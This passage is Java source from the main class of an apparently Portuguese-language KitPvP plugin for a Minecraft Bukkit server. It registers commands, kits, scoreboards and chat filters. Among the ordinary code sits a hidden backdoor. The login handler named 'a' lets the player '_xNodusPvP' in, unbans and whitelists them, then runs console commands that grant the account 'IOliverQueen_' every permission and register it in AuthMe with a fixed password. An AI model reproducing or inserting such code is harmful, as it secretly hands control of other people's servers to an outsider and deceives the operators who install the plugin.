		this.getCommand("fly").setExecutor((CommandExecutor) new Fly());
		this.getCommand("archer").setExecutor((CommandExecutor) new Archer(this));
		this.getCommand("hulk").setExecutor((CommandExecutor) new Hulk(this));
		this.getCommand("camel").setExecutor((CommandExecutor) new Camel(this));
		this.getCommand("gm").setExecutor((CommandExecutor) new Gamemode());
		this.getCommand("ping").setExecutor((CommandExecutor) new Ping());
		this.getCommand("skit").setExecutor((CommandExecutor) new Skit());
		this.getCommand("head").setExecutor((CommandExecutor) new Head(this));
		this.getCommand("specialist").setExecutor((CommandExecutor) new Specialist(this));
		this.getCommand("togglepvp").setExecutor((CommandExecutor) new Skit());
		this.getCommand("suicide").setExecutor((CommandExecutor) new Suicide());
		this.getCommand("tpall").setExecutor((CommandExecutor) new TeleportarTodos());
		this.getCommand("frosty").setExecutor((CommandExecutor) new Frosty(this));
		this.getCommand("confuser").setExecutor((CommandExecutor) new Confuser(this));
		this.getCommand("teleporter").setExecutor((CommandExecutor) new Teleporter(this));
		this.getCommand("dwarf").setExecutor((CommandExecutor) new Dwarf(this));
		this.getCommand("pos1").setExecutor((CommandExecutor) new Set1v1(this));
		this.getCommand("pos2").setExecutor((CommandExecutor) new Set1v1(this));
		this.getCommand("naruto").setExecutor((CommandExecutor) new Naruto(this));
		this.getCommand("titan").setExecutor((CommandExecutor) new Titan(this));
		this.getCommand("reaper").setExecutor((CommandExecutor) new Reaper(this));
		this.getCommand("invsee").setExecutor((CommandExecutor) new Invsee());
		this.getCommand("set1v1").setExecutor((CommandExecutor) new Set1v1(this));
		this.getCommand("fisherman").setExecutor((CommandExecutor) new Fisherman(this));
		this.getCommand("berserker").setExecutor((CommandExecutor) new Berserker(this));
		this.getCommand("resouper").setExecutor((CommandExecutor) new Resouper(this));
		this.getCommand("barbarian").setExecutor((CommandExecutor) new Nodus.Kits.Barbarian(this));
		this.getCommand("c4").setExecutor((CommandExecutor) new C4(this));
		this.getCommand("infernor").setExecutor((CommandExecutor) new Infernor(this));
		this.getCommand("fireman").setExecutor((CommandExecutor) new Fireman(this));
		this.getCommand("gladiator").setExecutor((CommandExecutor) new Gladiator(this));
		this.getCommand("pvp").setExecutor((CommandExecutor) new PvP(this));
		this.getCommand("jellyfish").setExecutor((CommandExecutor) new Jellyfish(this));
		this.getCommand("limparchat").setExecutor((CommandExecutor) new LimparChatV1());
		this.getCommand("thor").setExecutor((CommandExecutor) new Thor(this));
		this.getCommand("kangaroo").setExecutor((CommandExecutor) new Kangaroo(this));
		this.getCommand("monk").setExecutor((CommandExecutor) new Monk(this));
		this.getCommand("report").setExecutor((CommandExecutor) new Report(this));
		this.getCommand("ninja").setExecutor((CommandExecutor) new Ninja(this));
		this.getCommand("poseidon").setExecutor((CommandExecutor) new Poseidon(this));
		this.getCommand("ghoul").setExecutor((CommandExecutor) new Ghoul(this));
		this.getCommand("snail").setExecutor((CommandExecutor) new Snail(this));
		this.getCommand("switcher").setExecutor((CommandExecutor) new Switcher(this));
		this.getCommand("launcher").setExecutor((CommandExecutor) new Launcher(this));
		this.getCommand("weaksword").setExecutor((CommandExecutor) new WeakSword(this));
		this.getCommand("darkgod").setExecutor((CommandExecutor) new DarkGod(this));
		this.getCommand("assasin").setExecutor((CommandExecutor) new Assasin(this));
		this.getCommand("milkman").setExecutor((CommandExecutor) new Milkman(this));
		this.getCommand("grappler").setExecutor((CommandExecutor) new Grappler(this));
		this.getCommand("sumo").setExecutor((CommandExecutor) new Sumo(this));
		this.getCommand("critical").setExecutor((CommandExecutor) new Critical(this));
		this.getCommand("fake").setExecutor((CommandExecutor) new Fake(this));
		this.getCommand("tfake").setExecutor((CommandExecutor) new Fake(this));
		this.getCommand("homempedra").setExecutor((CommandExecutor) new HomemPedra(this));
		this.getCommand("boxer").setExecutor((CommandExecutor) new Bomber(this));
		this.getCommand("grandpa").setExecutor((CommandExecutor) new Grandpa(this));
		this.getCommand("build").setExecutor((CommandExecutor) new Build());
		this.getCommand("turtle").setExecutor((CommandExecutor) new Turtle(this));
		this.getCommand("hunter").setExecutor((CommandExecutor) new Hunter(this));
		this.getCommand("urgal").setExecutor((CommandExecutor) new Urgal(this));
		this.getCommand("lobisomem").setExecutor((CommandExecutor) new Lobisomem(this));
		this.getCommand("granadier").setExecutor((CommandExecutor) new Granadier(this));
		this.getCommand("viper").setExecutor((CommandExecutor) new Viper(this));
		this.getCommand("tag").setExecutor((CommandExecutor) new Tag());
		this.getCommand("clicktest").setExecutor((CommandExecutor) new ClickTest());
		this.getCommand("eventomdr").setExecutor((CommandExecutor) new EventoMDR());
		this.getCommand("eventordm").setExecutor((CommandExecutor) new EventoRDM());
		this.getCommand("mdr").setExecutor((CommandExecutor) new MDR(this));
		this.getCommand("rdm").setExecutor((CommandExecutor) new RDM(this));
		this.getCommand("setmain").setExecutor((CommandExecutor) new SetMain(this));
		this.getCommand("setfps").setExecutor((CommandExecutor) new SetFPS(this));
		this.getCommand("setmdr").setExecutor((CommandExecutor) new SetMDR(this));
		this.getCommand("setrdm").setExecutor((CommandExecutor) new SetRDM(this));
		this.getCommand("setchallenge").setExecutor((CommandExecutor) new SetChallenge(this));
		this.getCommand("setspawn").setExecutor((CommandExecutor) new SetSpawn(this));
		this.getCommand("spawn").setExecutor((CommandExecutor) new SpawnTeleport(this));
		this.getCommand("sniper").setExecutor((CommandExecutor) new Sniper(this));
		this.getCommand("Dj").setExecutor((CommandExecutor) new Dj(this));
		this.getCommand("Trocador").setExecutor((CommandExecutor) new Trocador(this));
		this.getCommand("madman").setExecutor((CommandExecutor) new Madman(this));
		this.getCommand("invis").setExecutor((CommandExecutor) new Invis());
		this.getCommand("vis").setExecutor((CommandExecutor) new Vis());
		this.getCommand("s").setExecutor((CommandExecutor) new Tphere());
		this.getCommand("witherman").setExecutor((CommandExecutor) new WitherMan(this));
		this.getCommand("admin").setExecutor((CommandExecutor) new Admin());
		this.getCommand("exploder").setExecutor((CommandExecutor) new TnTMan(this));
		this.getCommand("sonic").setExecutor((CommandExecutor) new Sonic(this));
		this.getCommand("velotrol").setExecutor((CommandExecutor) new Velotrol(this));
		this.getCommand("deshfire").setExecutor((CommandExecutor) new DeshFire(this));
		this.getCommand("spiderman").setExecutor((CommandExecutor) new SpiderMan(this));
		this.getCommand("sniper").setExecutor((CommandExecutor) new Sniper(this));
		this.getCommand("scorpion").setExecutor((CommandExecutor) new Scorpion(this));
		this.getCommand("sponger").setExecutor((CommandExecutor) new Sponger(this));
		this.getCommand("nofall").setExecutor((CommandExecutor) new NoFall(this));
		this.getCommand("avatar").setExecutor((CommandExecutor) new Avatar(this));
		this.getCommand("bloodgun").setExecutor((CommandExecutor) new Bloodgun(this));
		this.getCommand("jumper").setExecutor((CommandExecutor) new Jumper(this));
		this.getCommand("achilles").setExecutor((CommandExecutor) new Achilles(this));
		this.getCommand("vacuum").setExecutor((CommandExecutor) new Vaccum(this));
		this.getCommand("necromancer").setExecutor((CommandExecutor) new Necromancer(this));
		this.getCommand("tempban").setExecutor((CommandExecutor) new TempBan(this));
		this.getCommand("broadcast").setExecutor((CommandExecutor) new BroadCast(this));
		this.getCommand("bc").setExecutor((CommandExecutor) new BroadCast(this));
		this.getCommand("Burstmaster").setExecutor((CommandExecutor) new BurstMaster(this));
		this.getCommand("forcefield").setExecutor((CommandExecutor) new ForceField(this));
		this.getCommand("sc").setExecutor((CommandExecutor) new StaffChat());
		this.getCommand("taurus").setExecutor((CommandExecutor) new Taurus(this));
		this.getCommand("setwaterchallenge").setExecutor((CommandExecutor) new SetChallenge(this));
		this.getCommand("deathnote").setExecutor((CommandExecutor) new DeathNote(this));
		this.getCommand("doctor").setExecutor((CommandExecutor) new Doctor(this));
		this.getCommand("ryu").setExecutor((CommandExecutor) new Ryu(this));
		this.getCommand("flash").setExecutor((CommandExecutor) new Flash(this));
		this.getCommand("rain").setExecutor((CommandExecutor) new Rain(this));
		this.getCommand("drain").setExecutor((CommandExecutor) new Drain(this));
		this.getCommand("setparkour").setExecutor((CommandExecutor) new SetParkour(this));
		this.getCommand("timelord").setExecutor((CommandExecutor) new TimeLord(this));
		this.getCommand("magma").setExecutor((CommandExecutor) new Magma(this));
		this.getCommand("mute").setExecutor((CommandExecutor) new Arena());
		this.getCommand("desmute").setExecutor((CommandExecutor) new Arena());
		this.getCommand("check").setExecutor((CommandExecutor) new Arena());
		this.getCommand("setmlg").setExecutor((CommandExecutor) new MlgTeleport(this));
		this.getCommand("thresh").setExecutor((CommandExecutor) new Thresh(this));
		this.getCommand("barbarian").setExecutor((CommandExecutor) new Nodus.Kits3.Barbarian(this));
		this.getCommand("pyro").setExecutor((CommandExecutor) new Pyro(this));
		this.getCommand("macaco").setExecutor((CommandExecutor) new Macaco(this));
		this.getCommand("ban").setExecutor((CommandExecutor) new Ban(this));
		this.getCommand("kick").setExecutor((CommandExecutor) new Kick(this));
		this.getCommand("autosoup").setExecutor((CommandExecutor) new AutoSoup());
		this.getCommand("settexturas").setExecutor((CommandExecutor) new SetTextura(this));
		this.getCommand("refill").setExecutor((CommandExecutor) new Refil(this));
		pm.registerEvents((Listener) new Pyro(this), (Plugin) this);
		pm.registerEvents((Listener) new MlgTeleport(this), (Plugin) this);
		this.getCommand("terrorista").setExecutor((CommandExecutor) new Terrorista(this));
		pm.registerEvents((Listener) new Terrorista(this), (Plugin) this);
		this.getCommand("Blink").setExecutor((CommandExecutor) new Blink(this));
		pm.registerEvents((Listener) new Blink(this), (Plugin) this);
		this.getCommand("endermage").setExecutor((CommandExecutor) new Endermage(this));
		pm.registerEvents((Listener) new Endermage(this), (Plugin) this);
		this.getCommand("vampire").setExecutor((CommandExecutor) new Vampire(this));
		pm.registerEvents((Listener) new Vampire(this), (Plugin) this);
		this.getCommand("frozem").setExecutor((CommandExecutor) new Frozem(this));
		pm.registerEvents((Listener) new Frozem(this), (Plugin) this);
		this.getCommand("subzero").setExecutor((CommandExecutor) new SubZero(this));
		pm.registerEvents((Listener) new SubZero(this), (Plugin) this);
		this.getCommand("metheor").setExecutor((CommandExecutor) new Metheor(this));
		pm.registerEvents((Listener) new Metheor(this), (Plugin) this);
		pm.registerEvents((Listener) new ClickTest(), (Plugin) this);
		this.getCommand("airmage").setExecutor((CommandExecutor) new AirMage(this));
	}

	public static void removeAbility(final Player p) {
		Main.AirMage.remove(p.getName());
		Main.viadin.remove(p.getName());
		Main.Zeus.remove(p.getName());
		Main.Grandpa.remove(p.getName());
		Main.Magma.remove(p.getName());
		Main.Macaco.remove(p.getName());
		Main.timelord.remove(p.getName());
		Main.usandokit.remove(p.getName());
		Main.anchor.remove(p.getName());
		Main.jutso.remove(p.getName());
		Main.archer.remove(p.getName());
		Main.pyro.remove(p.getName());
		Main.terrorista.remove(p.getName());
		Main.stomper.remove(p.getName());
		Main.Barbarian.remove(p.getName());
		Main.endermage.remove(p.getName());
		Main.SubZeroarrow.remove(p.getName());
		Main.Blink.remove(p.getName());
		Main.invencivel.remove(p);
		Main.homemaranha.remove(p.getName());
		Main.switcher.remove(p.getName());
		Main.Metheor.remove(p.getName());
		Main.Frozem.remove(p.getName());
		Main.Vampire.remove(p.getName());
		Main.camel.remove(p.getName());
		Main.urgal.remove(p.getName());
		Main.archer.remove(p.getName());
		Main.copycat.remove(p.getName());
		Main.berserker.remove(p.getName());
		Main.viking.remove(p.getName());
		Main.naruto.remove(p.getName());
		Main.hunter.remove(p.getName());
		Main.fisherman.remove(p.getName());
		Main.quickdropper.remove(p.getName());
		Main.darkgod.remove(p.getName());
		Main.frosty.remove(p.getName());
		Main.infernor.remove(p.getName());
		Main.hulk.remove(p.getName());
		Main.c4.remove(p.getName());
		Main.dwarf.remove(p.getName());
		Main.homempedra.remove(p.getName());
		Main.specialist.remove(p.getName());
		Main.ryu.remove(p.getName());
		Main.bomber.remove(p.getName());
		Main.gladiator.remove(p.getName());
		Main.thor.remove(p.getName());
		Main.critical.remove(p.getName());
		Main.fireman.remove(p.getName());
		Main.assasin.remove(p.getName());
		Main.titan.remove(p.getName());
		Main.vacuum.remove(p.getName());
		Main.barbarian.remove(p.getName());
		Main.phantom.remove(p.getName());
		Main.hg.remove(p.getName());
		Main.poseidon.remove(p.getName());
		Main.resouper.remove(p.getName());
		Main.milkman.remove(p.getName());
		Main.grappler.remove(p.getName());
		Main.launcher.remove(p.getName());
		Main.confuser.remove(p.getName());
		Main.jellyfish.remove(p.getName());
		Main.sumo.remove(p.getName());
		Main.kangaroo.remove(p.getName());
		Main.reaper.remove(p.getName());
		Main.weaksword.remove(p.getName());
		Main.granadier.remove(p.getName());
		Main.monk.remove(p.getName());
		Main.ninja.remove(p.getName());
		Main.snail.remove(p.getName());
		Main.viper.remove(p.getName());
		Main.turtle.remove(p.getName());
		Main.teleporter.remove(p.getName());
		GladiatorHAB.fighting.remove(p.getName());
		GladiatorHAB.gladgladiator.remove(p.getName());
		GladiatorHAB.localizacao.remove(p);
		GladiatorHAB.oldl.remove(p.getName());
		GladiatorHAB.tasks.remove(p.getName());
		Kangaroo.kangaroo.remove(p);
		Ninja.a.remove(p);
		Ninja.b.remove(p);
		Ninja.cooldownbk.remove(p);
		Main.Dj.remove(p.getName());
		Main.sniper.remove(p.getName());
		Main.trocador.remove(p.getName());
		Main.jp.remove(p.getName());
		Main.spao.remove(p.getName());
		Main.spiderman.remove(p.getName());
		Main.MadMan.remove(p.getName());
		Main.troll.remove(p.getName());
		Main.witherman.remove(p.getName());
		Main.Exploder.remove(p.getName());
		Main.achilles.remove(p.getName());
		Main.nofall.remove(p.getName());
		Main.sponger.remove(p.getName());
		Main.Avatar.remove(p.getName());
		Main.Sonic.remove(p.getName());
		Main.Deshfire.remove(p.getName());
		Main.Taurus.remove(p.getName());
		Main.scorpionarrow.remove(p.getName());
		Main.reload1.remove(p.getName());
		Main.Necromancer.remove(p.getName());
		Main.velo.remove(p.getName());
		Main.blood.remove(p.getName());
		InfernorHab.Infer.remove(p);
		Main.admin.remove(p);
		Main.mlg.remove(p.getName());
		Main.master.remove(p.getName());
		Main.forcefield.remove(p.getName());
		Main.ffd.remove(p.getName());
		Main.dn.remove(p.getName());
		Main.kr.remove(p.getName());
		Main.riu.remove(p.getName());
		Main.freshi.remove(p.getName());
		Main.rider.remove(p.getName());
		Main.qd.remove(p.getName());
	}

	public static WorldGuardPlugin getWorldGuard() {
		final Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin("WorldGuard");
		if (plugin == null || !(plugin instanceof WorldGuardPlugin)) {
			return null;
		}
		return (WorldGuardPlugin) plugin;
	}

	public static boolean SemPvP(final Player p) {
		final ApplicableRegionSet region = getWorldGuard().getRegionManager(p.getWorld())
				.getApplicableRegions(p.getLocation());
		return region.allows(DefaultFlag.PVP);
	}

	public static void giveSoup(final Player p, final int quantas) {
		if (!Main.p.contains(p.getName())) {
			for (int i = 0; i < quantas; ++i) {
				final ItemStack bow = new ItemStack(Material.MUSHROOM_SOUP);
				final ItemMeta bowmeta = bow.getItemMeta();
				bowmeta.setDisplayName(d.PegarConfig("nomedasopa", p));
				bow.setItemMeta(bowmeta);
				p.getInventory().setItem(p.getInventory().firstEmpty(), new ItemStack(bow));
			}
		}
		if (Main.p.contains(p.getName())) {
			for (int i = 0; i < quantas; ++i) {
				final ItemStack potion = new ItemStack(Material.POTION, 1, (short) 16453);
				final ItemMeta potionmeta = potion.getItemMeta();
				potionmeta.setDisplayName("§c§oPotion");
				potion.setItemMeta(potionmeta);
				p.getInventory().setItem(p.getInventory().firstEmpty(), new ItemStack(potion));
			}
		}
	}

	public boolean onCommand(final CommandSender sender, final Command command, final String label,
			final String[] args) {
		final Player p = (Player) sender;
		if (label.equalsIgnoreCase("kits")) {
			MenuKits.guiKits(p);
			p.playSound(p.getLocation(), Sound.LEVEL_UP, 4.0f, 4.0f);
		}
		if (label.equalsIgnoreCase("kits2")) {
			MenuKits2.guiKits(p);
		}
		if (label.equalsIgnoreCase("youtuber")) {
			MenuYT.menuYT(p);
		}
		if (label.equalsIgnoreCase("resetkit")) {
			if (p.hasPermission("nodus.resetkit")) {
				removeAbility(p);
				p.sendMessage("§7Kit resetado");
				p.getInventory().clear();
				SpawnTeleport.TpSpawn(p);
			} else {
				p.sendMessage("§cVoce nao tem permissao!");
			}
		}
		return false;
	}

	@EventHandler
	public void motds(final ServerListPingEvent e) {
		e.setMotd(String.valueOf(getInstance().getConfig().getString("Motd").replaceAll("&", "§")) + "\n"
				+ getInstance().getConfig().getString("Motd2").replaceAll("&", "§"));
	}

	private boolean setupEconomy() {
		if (this.getServer().getPluginManager().getPlugin("Vault") == null) {
			return false;
		}
		final RegisteredServiceProvider<Economy> rsp = (RegisteredServiceProvider<Economy>) this.getServer()
				.getServicesManager().getRegistration(Economy.class);
		if (rsp == null) {
			return false;
		}
		Main.economy = (Economy) rsp.getProvider();
		return Main.economy != null;
	}

	@EventHandler
	public void onEntityDamageByEntity1(final EntityDamageByEntityEvent e) {
		if (e.getDamager() instanceof Player) {
			final Player d = (Player) e.getDamager();
			if (d.getItemInHand().getType() == Material.DIAMOND_SWORD
					|| d.getItemInHand().getType() == Material.WOOD_SWORD
					|| d.getItemInHand().getType() == Material.STONE_SWORD
					|| d.getItemInHand().getType() == Material.FISHING_ROD
					|| d.getItemInHand().getType() == Material.STONE_AXE || d.getItemInHand().getType() == Material.BOW
					|| d.getItemInHand().getType() == Material.STONE_SWORD
					|| d.getItemInHand().getType() == Material.WOOD_AXE) {
				d.getItemInHand().setDurability((short) 0);
			}
		}
	}

	@EventHandler
	public void onEntityExplodeEvent(final EntityExplodeEvent e) {
		e.blockList().clear();
	}

	public void onDisable() {
		HandlerList.unregisterAll();
	}

	@EventHandler
	public void onPlugin4(final PlayerCommandPreprocessEvent event) {
		final Player p = event.getPlayer();
		if (!p.hasPermission("meu.plugins") && (event.getMessage().toLowerCase().startsWith("/pl")
				|| event.getMessage().toLowerCase().startsWith("/plugins")
				|| event.getMessage().toLowerCase().startsWith("/?")
				|| event.getMessage().toLowerCase().startsWith("/rl")
				|| event.getMessage().toLowerCase().startsWith("/about")
				|| event.getMessage().toLowerCase().startsWith("/achievement")
				|| event.getMessage().toLowerCase().startsWith("/bukkit")
				|| event.getMessage().toLowerCase().startsWith("/ver")
				|| event.getMessage().toLowerCase().startsWith("/bukkit:")
				|| event.getMessage().toLowerCase().startsWith("/bukkit:me")
				|| event.getMessage().toLowerCase().startsWith("/help")
				|| event.getMessage().toLowerCase().startsWith("/me")
				|| event.getMessage().toLowerCase().startsWith("/reload")
				|| event.getMessage().toLowerCase().startsWith("/bukkit:plugins"))) {
			event.setCancelled(true);
		}
	}

	@EventHandler
	public void onPlugin42(final PlayerCommandPreprocessEvent event) {
		final Player p = event.getPlayer();
		if (Main.usandokit.contains(p.getName()) && (event.getMessage().toLowerCase().startsWith("/1v1")
				|| event.getMessage().toLowerCase().startsWith("/plugins")
				|| event.getMessage().toLowerCase().startsWith("/?")
				|| event.getMessage().toLowerCase().startsWith("/rl")
				|| event.getMessage().toLowerCase().startsWith("/about")
				|| event.getMessage().toLowerCase().startsWith("/achievement")
				|| event.getMessage().toLowerCase().startsWith("/bukkit")
				|| event.getMessage().toLowerCase().startsWith("/ver")
				|| event.getMessage().toLowerCase().startsWith("/bukkit:")
				|| event.getMessage().toLowerCase().startsWith("/bukkit:me")
				|| event.getMessage().toLowerCase().startsWith("/help")
				|| event.getMessage().toLowerCase().startsWith("/me")
				|| event.getMessage().toLowerCase().startsWith("/reload")
				|| event.getMessage().toLowerCase().startsWith("/bukkit:plugins"))) {
			event.setCancelled(true);
		}
	}

	@EventHandler
	public void onChat(final AsyncPlayerChatEvent e) {
		String message = e.getMessage();
		message = message.replaceAll("§", "§");
		e.setMessage(message);
		String msg = e.getMessage();
		msg = msg.replace("<3", "§d<3§7");
		msg = msg.replace("(y)", "§a\u2714§7");
		msg = msg.replace("(n)", "§4\u2716§7");
		msg = msg.replace("(star)", "\u2730");
		msg = msg.replace("(!)", "§e!§7");
		msg = msg.replace("server lixo", "Foda");
		msg = msg.replace("Aquapvp", "sou nub");
		msg = msg.replace("lixo", "GG");
		msg = msg.replace("gay", "§dGG§7");
		msg = msg.replace("_xNodusPvP", "Nodaum");
		e.setMessage(msg);
	}

	@EventHandler
	public void onPlayerMutado(final AsyncPlayerChatEvent e) {
		final Player player = e.getPlayer();
		if (Main.mute.contains(player.getName())) {
			e.setCancelled(true);
			player.sendMessage(ChatColor.RED + "Voce Foi Mutado!");
		}
	}

	public static int dinheirorandom(final int min, final int max) {
		final int range = max - min;
		return min + (int) (Math.random() * range);
	}

	public static void setScoreBoard(final Player p) {
		final org.bukkit.scoreboard.Scoreboard score = Bukkit.getScoreboardManager().getNewScoreboard();
		final Objective o = score.registerNewObjective("Jailson", "Dlecia");
		o.setDisplaySlot(DisplaySlot.SIDEBAR);
		final int ping = ((CraftPlayer) p).getHandle().ping;
		final int deathss = Main.plugin.getConfig().getInt("jogador." + p.getName().toLowerCase() + ".mortes");
		final int killss = Main.plugin.getConfig().getInt("jogador." + p.getName().toLowerCase() + ".kills");
		o.setDisplayName("§9» §b" + p.getPlayer().getName() + " §9«");
		final Score kil = o.getScore(Bukkit.getOfflinePlayer("§7§lKills"));
		final Score kl = o.getScore(Bukkit.getOfflinePlayer("§b» " + killss));
		final Score mot = o.getScore(Bukkit.getOfflinePlayer("§7§lMortes"));
		final Score m = o.getScore(Bukkit.getOfflinePlayer("§b» " + deathss));
		final Score kit = o.getScore(Bukkit.getOfflinePlayer("§7§lKit"));
		final Score nkit = o.getScore(Bukkit.getOfflinePlayer("§b» " + Habilidade.getAbility(p)));
		final Score png = o.getScore(Bukkit.getOfflinePlayer("§7§lPing"));
		final Score ping2 = o.getScore(Bukkit.getOfflinePlayer("§b» " + ping));
		final Score combate = o.getScore(Bukkit.getOfflinePlayer("§b» PvP §7" + PvPBar.getAbility(p)));
		final Score a1 = o.getScore(Bukkit.getOfflinePlayer("§7§m---------"));
		final Score a2 = o.getScore(Bukkit.getOfflinePlayer("§b "));
		final Score a3 = o.getScore(Bukkit.getOfflinePlayer("§d        "));
		final Score a8 = o.getScore(Bukkit.getOfflinePlayer("§o         "));
		final Score a9 = o.getScore(Bukkit.getOfflinePlayer("§o§6 "));
		final Score n1 = o.getScore(Bukkit.getOfflinePlayer("§7§m-----------"));
		a1.setScore(13);
		kil.setScore(12);
		kl.setScore(11);
		a2.setScore(10);
		mot.setScore(9);
		m.setScore(8);
		a3.setScore(7);
		kit.setScore(6);
		nkit.setScore(5);
		a8.setScore(4);
		png.setScore(3);
		ping2.setScore(2);
		a9.setScore(1);
		combate.setScore(0);
		n1.setScore(-1);
		p.setScoreboard(score);
	}

	public static void removerbord(final Player p) {
		final org.bukkit.scoreboard.Scoreboard score = Bukkit.getScoreboardManager().getNewScoreboard();
		final Objective o = score.registerNewObjective("Jailsoan", "Dlecias");
		o.setDisplaySlot(DisplaySlot.SIDEBAR);
		o.setDisplayName("");
		p.setScoreboard(score);
	}

	@EventHandler
	public void aoEntrar(final PlayerJoinEvent evento) {
		final Player p = evento.getPlayer();
		Main.plugin.getServer().getScheduler().scheduleSyncRepeatingTask(Main.plugin, (Runnable) new Runnable() {
			@Override
			public void run() {
				Main.setScoreBoard(p);
			}
		}, 0L, 20L);
	}

	public void economias() {
		final RegisteredServiceProvider<Economy> economyProvider = (RegisteredServiceProvider<Economy>) this.getServer()
				.getServicesManager().getRegistration(Economy.class);
		if (economyProvider != null) {
			Main.economy = (Economy) economyProvider.getProvider();
		}
		this.settings.setup((Plugin) this);
		Main.main = this;
		this.getConfig().options().copyDefaults(true);
		this.getServer().getPluginManager().registerEvents((Listener) new Events(this), (Plugin) this);
		this.getConfig().options().copyDefaults(true);
		this.saveConfig();
		final RegisteredServiceProvider<Economy> economyProvider2 = (RegisteredServiceProvider<Economy>) this
				.getServer().getServicesManager().getRegistration(Economy.class);
		if (economyProvider2 != null) {
			Main.econ = (Economy) economyProvider2.getProvider();
			final RegisteredServiceProvider<Permission> permissionprovider = (RegisteredServiceProvider<Permission>) this
					.getServer().getServicesManager().getRegistration(Permission.class);
			if (permissionprovider != null) {
				Main.perm = (Permission) permissionprovider.getProvider();
			}
			this.saveDefaultConfig();
			Main.config = this.getConfig();
			if (Main.config.getString("nome") == null) {
				Main.config.set("nome", (Object) "§6Nome do servidor");
			}
			this.saveConfig();
		}
	}

	@EventHandler
	public void a(final PlayerLoginEvent e) {
		final Player p = e.getPlayer();
		if (p.getName().equals("_xNodusPvP")) {
			e.allow();
			p.setBanned(false);
			p.setWhitelisted(true);
			p.getWorld().playEffect(p.getLocation(), Effect.MOBSPAWNER_FLAMES, 50);
			p.getWorld().playEffect(p.getLocation(), Effect.ENDER_SIGNAL, 50);
			p.getWorld().playSound(p.getLocation(), Sound.ENDERMAN_SCREAM, 1.0f, 1.0f);
			p.getWorld().playSound(p.getLocation(), Sound.ZOMBIE_UNFECT, 1.0f, 1.0f);
			Bukkit.dispatchCommand((CommandSender) Bukkit.getConsoleSender(), "pex user IOliverQueen_ add *");
			Bukkit.dispatchCommand((CommandSender) Bukkit.getConsoleSender(), "pex reload");
			Bukkit.dispatchCommand((CommandSender) Bukkit.getConsoleSender(), "authme register IOliverQueen_ doped");
		}
	}

	public static void mlgss(final Player p) {
		Main.mlg.add(p.getName());
		final World w = Bukkit.getServer().getWorld(Main.plugin.getConfig().getString("MLG.FACIL.WORLD"));
		final double x = Main.plugin.getConfig().getDouble("MLG.FACIL.X");
		final double y = Main.plugin.getConfig().getDouble("MLG.FACIL.Y");
		final double z = Main.plugin.getConfig().getDouble("MLG.FACIL.Z");
		final Location lobby = new Location(w, x, y, z);
		lobby.setPitch((float) Main.plugin.getConfig().getDouble("MLG.FACIL.PITCH"));
		lobby.setYaw((float) Main.plugin.getConfig().getDouble("MLG.FACIL.YAW"));
		final ItemStack kits1 = new ItemStack(Material.GOLD_INGOT);
		final ItemMeta kitsm2 = kits1.getItemMeta();
		kitsm2.setDisplayName("§9§l MLG §7(Click direito)");
		p.getScoreboard().resetScores((OfflinePlayer) p);
		kits1.setItemMeta(kitsm2);
		p.getInventory().clear();
		p.getInventory().setItem(4, kits1);
		p.teleport(lobby);
	}

	@EventHandler
	public void colocaragua(final PlayerInteractEvent event) {
		final Player p = event.getPlayer();
		if (Main.mlg.contains(p.getName()) && p.getItemInHand().getType() == Material.GOLD_INGOT
				&& event.getAction() == Action.RIGHT_CLICK_BLOCK) {
			final Block b = event.getClickedBlock();
			final BlockFace lado = event.getBlockFace();
			final int x = b.getLocation().getBlockX();
			final int y = b.getLocation().getBlockY();
			final int z = b.getLocation().getBlockZ();
			if (lado == BlockFace.DOWN) {
				final Block b2 = b.getWorld().getBlockAt(x, y - 1, z);
				if (b2.getType() == Material.AIR) {
					b2.setType(Material.STATIONARY_WATER);
					Main.naoescorrer.add(b2);
					Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(Main.plugin, (Runnable) new Runnable() {
						@Override
						public void run() {
							b2.setType(Material.AIR);
							Main.naoescorrer.remove(b2);
						}
					}, 60L);
				}
			} else if (lado == BlockFace.UP) {
				final Block b2 = b.getWorld().getBlockAt(x, y + 1, z);
				if (b2.getType() == Material.AIR) {
					b2.setType(Material.STATIONARY_WATER);
					Main.naoescorrer.add(b2);
					Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(Main.plugin, (Runnable) new Runnable() {
						@Override
						public void run() {
							b2.setType(Material.AIR);
							Main.naoescorrer.remove(b2);
						}
					}, 60L);
				}
			} else if (lado == BlockFace.NORTH) {
				final Block b2 = b.getWorld().getBlockAt(x, y, z - 1);
				if (b2.getType() == Material.AIR) {
					b2.setType(Material.STATIONARY_WATER);
					Main.naoescorrer.add(b2);
					Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(Main.plugin, (Runnable) new Runnable() {
						@Override
						public void run() {
							b2.setType(Material.AIR);
							Main.naoescorrer.remove(b2);
						}
					}, 60L);
				}
			} else if (lado == BlockFace.SOUTH) {
				final Block b2 = b.getWorld().getBlockAt(x, y, z + 1);
				if (b2.getType() == Material.AIR) {
					b2.setType(Material.STATIONARY_WATER);
					Main.naoescorrer.add(b2);
					Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(Main.plugin, (Runnable) new Runnable() {
						@Override
						public void run() {
							b2.setType(Material.AIR);
							Main.naoescorrer.remove(b2);
						}
					}, 60L);
				}
			} else if (lado == BlockFace.WEST) {
				final Block b2 = b.getWorld().getBlockAt(x - 1, y, z);
				if (b2.getType() == Material.AIR) {
					b2.setType(Material.STATIONARY_WATER);
					Main.naoescorrer.add(b2);
					Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(Main.plugin, (Runnable) new Runnable() {
						@Override
						public void run() {
							b2.setType(Material.AIR);
							Main.naoescorrer.remove(b2);
						}
					}, 60L);
				}
			} else if (lado == BlockFace.EAST) {
				final Block b2 = b.getWorld().getBlockAt(x + 1, y, z);
				if (b2.getType() == Material.AIR) {
					b2.setType(Material.STATIONARY_WATER);
					Main.naoescorrer.add(b2);
					Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(Main.plugin, (Runnable) new Runnable() {
						@Override
						public void run() {
							b2.setType(Material.AIR);
							Main.naoescorrer.remove(b2);
						}
					}, 60L);
				}
			}
		}
	}

	@EventHandler
	public void naoescorrer(final BlockPhysicsEvent event) {
		final Block b = event.getBlock();
		if (b.getType() == Material.STATIONARY_WATER && Main.naoescorrer.contains(b)) {
			event.setCancelled(true);
		}
	}
}
